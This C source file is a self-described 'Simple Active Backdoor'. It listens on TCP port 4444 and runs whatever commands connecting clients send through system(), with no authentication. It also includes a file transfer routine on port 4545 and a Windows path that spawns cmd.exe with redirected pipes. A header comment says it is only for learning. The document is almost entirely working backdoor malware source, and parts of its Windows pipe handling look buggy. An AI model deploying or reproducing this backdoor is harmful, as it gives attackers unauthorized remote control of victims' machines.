/*
 ***************************************************
 * A simple backdoor for telnet.
 * by Philip "5n4k3" Simonson
 ***************************************************
 * Do NOT use for malicious activity. This was
 * created simply to learn from. This isn't very
 * good, so I wouldn't recommend using for
 * "cracking".
 ***************************************************
 */

/* --- File upload fully works now :P (All FiXeD) --- */

#if defined(_WIN32)
	#include <winsock2.h>
	#include <windows.h>
#else
	#include <sys/socket.h>
	#include <arpa/inet.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>

#define MY_PORT 4444
#define FILE_PORT 4545
#define VERSION_NUMBER "v0.02"

int main(argc,argv)
	int argc;
	char **argv;
{
	int upload_file();
	void handle_clients();
	int serverfd;
	struct sockaddr_in server;
	char buf[BUFSIZ];
	char msg[BUFSIZ];

#if defined(_WIN32)
	WSADATA wsaData;
	ZeroMemory(&wsaData,sizeof(wsaData));
	if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0) {
		fprintf(stderr,"Error: Cannot startup winsock [ERROR CODE: %d]\n",WSAGetLastError());
		return 1;
	}
	ZeroMemory(buf,sizeof(buf));
	ZeroMemory(msg,sizeof(msg));
#endif

	if(argc < 2) {
		errno = 0;
		if((serverfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
			fprintf(stderr,"Error: %s\n",strerror(errno));
#if defined(_WIN32)
			WSACleanup();
#endif
			return -1;
		}

#if defined(_WIN32)
		ZeroMemory(&server,sizeof(server));
#else
		bzero(&server,sizeof(server));
		bzero(buf,sizeof(buf));
		bzero(msg,sizeof(msg));
#endif
		server.sin_family = AF_INET;
		server.sin_port = htons(MY_PORT);
		server.sin_addr.s_addr = htonl(INADDR_ANY);

		errno = 0;
		if(bind(serverfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
			fprintf(stderr,"Error: %s\n",strerror(errno));
#if defined(_WIN32)
			closesocket(serverfd);
			WSACleanup();
#else
			close(serverfd);
#endif
			return -1;
		}
		printf("%s bound to port [%d].\n",inet_ntoa(server.sin_addr),MY_PORT);

		errno = 0;
		if(listen(serverfd,1) < 0) {
			fprintf(stderr,"Error: %s\n",strerror(errno));
#if defined(_WIN32)
			closesocket(serverfd);
			WSACleanup();
#else
			close(serverfd);
#endif
			return -1;
		}

		while(1) {
			int clientfd;
			struct sockaddr_in client;
			int clientlen = sizeof(client);
			clientfd = accept(serverfd,(struct sockaddr*)&client,&clientlen);
			if(clientfd > 0) {
				printf("%s:%d client connected.\n",inet_ntoa(client.sin_addr),
					MY_PORT);
				memset(msg,0,sizeof(msg));
				sprintf(msg,"SABD - Simple Active Backdoor %s\r\nType 'help' to find out what you can do...\r\n",VERSION_NUMBER);
				if(send(clientfd,msg,strlen(msg),0) != strlen(msg)) {
					puts("Couldn't send intro text.\n");
				}
				handle_clients(&clientfd,inet_ntoa(client.sin_addr));
#if defined(_WIN32)
				if(closesocket(clientfd) == 0) {
					printf("%s:%d client disconnected.\n",
						inet_ntoa(client.sin_addr),
						MY_PORT);
				}
#else
				if(close(clientfd) == 0) {
					printf("%s:%d client disconnected.\n",
						inet_ntoa(client.sin_addr),
						MY_PORT);
				}
#endif
			} else {
				puts("Cannot accept client connection.");
			}
		}

#if defined(_WIN32)
		closesocket(serverfd);
		WSACleanup();
#else
		close(serverfd);
#endif
	} else if(argc == 5 && argv[1][0] == '-' && argv[1][1] == 'u') {
		return upload_file(argv[2],argv[3],atoi(argv[4]));
	} else {
		printf("Usage: %s [-u] <IP-address> <filename.ext> <isserver>\n"
			"isserver - if 0 then its client anything else is server.\n",argv[0]);
	}
	return 0;
}

void strip_cmd(cmd)
	char *cmd;
{
	char tmp[128];
	int i;

	puts("Strippin' Command!");
	memset(tmp,0,sizeof(tmp));
	for(i=0; i<strlen(cmd)+1; ++i) {
		if(*(cmd+i) == 0x0A || *(cmd+i) == 0x0D) {
			continue;
		}
		tmp[i] = *(cmd+i);
	}
	for(i=0; i<strlen(cmd)+1; ++i) {
		*(cmd+i) = tmp[i];
	}
	*(cmd+i) = 0;
}

#define BUFSIZE 4096

void handle_clients(socket,address)
	int *socket;
	const char *address;
{
#if defined(_WIN32)
	SECURITY_ATTRIBUTES saAttr;
	HANDLE child_rd;
	HANDLE child_wr;
	HANDLE hSockFile;
	void create_child();
	void writepipe();
	void readpipe();
#endif
	void handle_commands();
	void get_cmd();
	char msg[256];
	char cmd[128];

#if defined(_WIN32)
	hSockFile = NULL;
	hSockFile = CreateFile("SocketInfo.log",GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_TEMPORARY,NULL);
	if(hSockFile == NULL)
		printf("Warning: prompt command is\ndisabled, do to socket not opened for reading.\n");
#endif

	while(1) {
		memset(msg,0,sizeof(msg));
		send(*socket,"CMD >> ",7,0);
		get_cmd(socket,address,cmd,sizeof(cmd));

		if(strcmp(cmd,"exit") == 0) {
			break;
		} else if(strcmp(cmd,"help") == 0) {
			sprintf(msg,"Commands: [exit,cmd,help]\r\n");
			send(*socket,msg,strlen(msg),0);
		} else if(strcmp(cmd,"cmd") == 0) {
			handle_commands(socket,address);
		} else if(strcmp(cmd,"prompt") == 0) {
#if defined(_WIN32)
			if(hSockFile != NULL) {
				saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
				saAttr.bInheritHandle = TRUE;
				saAttr.lpSecurityDescriptor = NULL;

				/* create a pipe for the child process's stdout */
				if(CreatePipe(&child_rd,&child_wr,&saAttr,0) == 0)
					puts("Error: Cannot create stdout pipe.");

				/* make the read handle to the pipe for stdout not inherited */
				if(SetHandleInformation(child_rd,HANDLE_FLAG_INHERIT,0) == 0)
					puts("Error: Cannot make handle not inherited for stdout.");

				/* create pipe for the child process's stdin */
				if(CreatePipe(&child_rd,&child_wr,&saAttr,0) == 0)
					puts("Error: Cannot create stdin pipe.");

				/* make the write handle to the pipe for stdin not inherited */
				if(SetHandleInformation(child_wr,HANDLE_FLAG_INHERIT,0) == 0)
					puts("Error: Cannot make handle not inherited for stdin.");

				/* Create the child process */
				create_child(hSockFile,child_wr,child_rd);
			} else
				printf("Warning: Socket wasn't opened cannot read.\n");
#else
			sprintf(msg,"Command not yet implemented.\r\n");
			send(*socket,msg,strlen(msg),0);
#endif
		} else {
			sprintf(msg,"Unknown command.\r\n");
			send(*socket,msg,strlen(msg),0);
		}
	}
}

void handle_commands(socket,address)
	int *socket;
	const char *address;
{
	void get_cmd();
	char cmd[128];

	send(*socket,"Enter command: ",15,0);
	get_cmd(socket,address,cmd,sizeof(cmd));
	system(cmd);
}

void get_cmd(socket,address,buf,size)
	int *socket;
	const char *address;
	char buf[];
	size_t size;
{
	char msg[256];
	char c;
	int i,bytes;
	memset(msg,0,sizeof(msg));
	memset(buf,0,size);
	i = 0;
	while((bytes = recv(*socket,&c,1,0)) != 0) {
		if(bytes < 0) {
			sprintf(msg,"Error: receiving from %s.\r\n",
				address);
			send(*socket,msg,strlen(msg),0);
			return;
		}
		if(c == 0x0A) {
			break;
		} else if(c == 0x08) {
			if(i > 0) {
				buf[i] = 0;
				--i;
			} else {
				continue;
			}
		} else {
			if(i < size-1) {
				buf[i] = c;
				++i;
			} else {
				break;
			}
		}
	}
	strip_cmd(buf);
}

int upload_file(address,filename,isserver)
	const char *address;
	const char *filename;
	char isserver;
{
	int sockfd,clientfd;
	size_t bytesRead,bytesWritten;
	struct sockaddr_in server;
	struct sockaddr_in client;
	FILE *file;
	char curdir[1024];
	char buf[512];

	if((sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
		perror("socket()");
#if defined(_WIN32)
		WSACleanup();
#endif
		return 1;
	}

#if defined(_WIN32)
	ZeroMemory(&server,sizeof(server));
	ZeroMemory(&client,sizeof(client));
#else
	bzero(&server,sizeof(server));
	bzero(&client,sizeof(client));
#endif
	if(isserver) {
		server.sin_family = AF_INET;
		server.sin_port = htons(FILE_PORT);
		server.sin_addr.s_addr = inet_addr(address);

		if(bind(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
			perror("bind()");
#if defined(_WIN32)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return -1;
		}
		puts("Socket created.");

		if(listen(sockfd,1) < 0) {
			perror("bind()");
#if defined(_WIN32)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return -1;
		}
		puts("Listening...");

		if((clientfd = accept(sockfd,(struct sockaddr*)NULL,NULL)) < 0) {
			puts("Error: Cannot accept client connection sorry :(");
#if defined(_WIN32)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return -1;
		}
		puts("Connection Established");

		if(getcwd(curdir,sizeof(curdir)) == NULL) {
			perror("getcwd()");
#if defined(_WIN32)
			closesocket(clientfd);
			closesocket(sockfd);
			WSACleanup();
#else
			close(clientfd);
			close(sockfd);
#endif
			return -1;
		}
		strncat(curdir,filename,sizeof(curdir));

		if((file = fopen(curdir,"wb")) == NULL) {
#if defined(_WIN32)
			closesocket(clientfd);
			closesocket(sockfd);
			WSACleanup();
#else
			close(clientfd);
			close(sockfd);
#endif
			return -1;
		}

		printf("Receiving file: %s\n",curdir);
		while((bytesRead = recv(clientfd,buf,sizeof(buf),0))) {
			bytesWritten = fwrite(buf,1,bytesRead,file);
			if(bytesWritten < 0) {
				puts("Error receiving file.");
				break;
			}
		}
		if(bytesRead == 0) {
			puts("File received.");
		}
		fclose(file);
	} else {
		server.sin_family = AF_INET;
		server.sin_port = htons(FILE_PORT);
		server.sin_addr.s_addr = inet_addr(address);

		if(connect(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
			puts("Error: Cannot connect to server sorry :(");
#if defined(_WIN32)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return -1;
		}
		puts("Connection Established");

		if(getcwd(curdir,sizeof(curdir)) == NULL) {
			perror("getcwd()");
#if defined(_WIN32)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return -1;
		}
		strncat(curdir,filename,sizeof(curdir));

		if((file = fopen(curdir,"rb")) == NULL) {
			printf("Error: Cannot open file %s.\n",curdir);
#if defined(_WIN32)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return -1;
		}

		printf("Transfering file: %s\n",curdir);
		while((bytesRead = fread(buf,1,sizeof(buf),file))) {
			bytesWritten = send(sockfd,buf,bytesRead,0);
			if(bytesWritten < 0) {
				puts("Error sending file.");
				break;
			}
		}
		if(bytesRead == 0) {
			puts("File Sent.");
		}
		fclose(file);

#if defined(_WIN32)
		closesocket(sockfd);
		WSACleanup();
#else
		close(sockfd);
#endif
		return 0;
	}

#if defined(_WIN32)
		closesocket(clientfd);
		closesocket(sockfd);
		WSACleanup();
#else
		close(clientfd);
		close(sockfd);
#endif
	return 0;
}

/* create_child() - creates child process to redirect input/output.
 */
void create_child(file,child_wr,child_rd)
	HANDLE file;
	HANDLE child_wr;
	HANDLE child_rd;
{
	PROCESS_INFORMATION piInfo;
	STARTUPINFO siInfo;
	BOOL bSuccess = FALSE;

	void writepipe();
	void readpipe();

	/* Set up member of the PROCESS_INFORMATION struct */
	ZeroMemory(&piInfo,sizeof(piInfo));

	/* Set up members of the STARTUPINFO struct */
	ZeroMemory(&siInfo,sizeof(siInfo));
	siInfo.cb = sizeof(STARTUPINFO);
	siInfo.hStdError = child_wr;
	siInfo.hStdOutput = child_wr;
	siInfo.hStdInput = child_rd;
	siInfo.dwFlags |= STARTF_USESTDHANDLES;

	/* Create child process */
	bSuccess = CreateProcess("C:\\Windows\\System32\\cmd.exe","child",NULL,NULL,TRUE,0,NULL,
		NULL,&siInfo,&piInfo);

	if(bSuccess == FALSE)
		printf("Error: Couldn't create child process.\n");
	else {
		while(piInfo.hProcess != 0) {
			writepipe(file,child_wr);
			readpipe(child_rd);
		}
		CloseHandle(piInfo.hProcess);
		CloseHandle(piInfo.hThread);
	}
}

void writepipe(file,child_wr)
	HANDLE file;
	HANDLE child_wr;
{
	DWORD dwRead,dwWritten;
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;

	for(;;) {
		bSuccess = ReadFile(file,chBuf,BUFSIZE,&dwRead,NULL);
		if(bSuccess == FALSE || dwRead == 0) break;

		bSuccess = WriteFile(child_wr,chBuf,dwRead,&dwWritten,NULL);
		if(bSuccess == FALSE) break;
	}

	/* Close the pipe handle so the child stops reading. */
	if(CloseHandle(child_wr) == 0)
		printf("Error: StdInWr CloseHandle\n");
}

void readpipe(child_rd)
	HANDLE child_rd;
{
	DWORD dwRead,dwWritten;
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	for(;;) {
		bSuccess = ReadFile(child_rd,chBuf,BUFSIZE,&dwRead,NULL);
		if(bSuccess == FALSE || dwRead == 0) break;

		bSuccess = WriteFile(hParentStdOut,chBuf,dwRead,&dwWritten,NULL);
		if(bSuccess == FALSE) break;
	}
}
